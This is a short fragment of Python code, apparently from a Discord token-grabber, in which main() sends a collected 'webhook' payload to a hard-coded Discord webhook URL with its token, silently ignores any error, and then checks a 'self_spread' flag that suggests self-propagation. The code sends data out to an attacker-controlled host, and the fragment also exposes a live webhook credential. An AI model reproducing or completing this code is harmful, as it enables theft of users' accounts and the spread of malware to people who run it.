...
def main():
    ...
    try:
        urlopen(Request("https://discordapp.com/api/webhooks/755501006887977041/Ay0pDVtdR6_zyVe-lkiOjGny7LKCNK3_nLvHH1IQC5k7dXrOM1nZZ_JJBxKpH98uPMn1", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
